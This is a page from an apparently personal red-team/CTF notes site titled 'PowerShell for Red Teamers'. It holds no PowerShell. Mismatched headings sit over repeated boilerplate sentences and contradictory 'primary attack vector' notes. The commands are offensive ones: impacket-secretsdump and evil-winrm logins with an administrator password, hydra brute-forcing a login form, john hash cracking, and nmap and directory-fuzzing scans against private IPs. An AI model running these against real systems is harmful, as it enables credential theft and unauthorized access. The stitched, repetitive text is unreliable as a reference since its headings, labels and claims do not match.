---
TitleSEO: "PowerShell for Red Teamers | ZureFX"
TitlePost: "PowerShell for Red Teamers"
Author: "ZureFX"
Description: "Personal notes on PowerShell for Red Teamers. Quick reference for pentesting and CTF challenges."
Keywords: "linux, malware, cheatsheet, lateral movement, privilege escalation"
URL: "https://zurefx.github.io/notes/note-powershell-for-red-teamers-464.html"
URL_IMAGES: ""
Date: "2024-01-02"
Tags: "Linux, Malware, Cheatsheet, Lateral Movement, Privilege Escalation"
Section: "notes"
Lang: "en"
main_img: "note-powershell-for-red-teamers-464"
Permalink: "/notes/note-powershell-for-red-teamers-464.html"
BtnLabel: "Read Notes"
Pick: 0
---
## AS-REP Roasting

### NTLM Relay

> **Note:** Golden Ticket was identified as the primary attack vector in this scenario.

```bash
nmap -sCV -p993,23,445 10.45.70.174 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.111.29.229
```

- `GetNPUsers`
- `AlwaysInstallElevated`
- `mimikatz`

> **Note:** Local File Inclusion was identified as the primary attack vector in this scenario.

## ligolo-ng

### psexec

Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.20.152.25
gobuster dir -u http://10.11.65.16/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file. The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

```bash
evil-winrm -i 10.74.175.228 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.21.164.247/FUZZ
```

## wpscan

### GetUserSPNs

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.117.5.36 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI).

Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target.

Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible. Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

```bash
feroxbuster -h
```

## AlwaysInstallElevated

### RDP

The backup files contained sensitive information that should not have been accessible. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
feroxbuster -h
nmap -sCV -p23,21,443 10.21.204.124 -oN scan.txt
evil-winrm -i 10.86.124.35 -u administrator -p 'P@ssw0rd!'
```
